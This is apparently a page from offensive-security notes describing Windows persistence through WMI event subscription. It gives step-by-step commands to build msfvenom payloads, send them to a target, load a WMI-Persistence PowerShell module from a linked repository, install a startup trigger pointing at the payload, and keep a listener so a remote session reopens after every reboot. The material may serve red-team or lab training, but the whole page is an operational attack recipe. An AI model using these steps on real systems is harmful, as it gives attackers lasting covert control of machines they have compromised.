# WMI

WMI (Windows Management Instrumentation) event subscription can be used to install event filters, providers, and bindings that execute code when a defined event occurs. It enables system administrators to perform tasks locally and remotely.

> (will create two payloads, one to gain access to the system and another for WMI event subscription)

1. Create two payload with `msfvenom` give the output `payload.exe`and `wmi.exe`&#x20;
2. Send both payload to target and run the `payload.exe`first
3. upload a file from **wmi-persistence** and load powershell by  `load powershell`&#x20;

{% embed url="https://github.com/subesp0x10/Wmi-Persistence" %}

4. open powershell in the console by type `powershell_shell`
5. import the module by type `Import-Module ./WMI-Persistence.ps1`
6. Type `Install-Persistance -Trigger Startup -Payload "C:\Users\Administrator\Downloads\wmi.exe"` &#x20;

> it will take approx. 5 minutes to run

7. Now open another terminal and set up listener that point the port to the `wmi.exe` , so whenever the machine is restarted, the session will open and get the machine rooted.
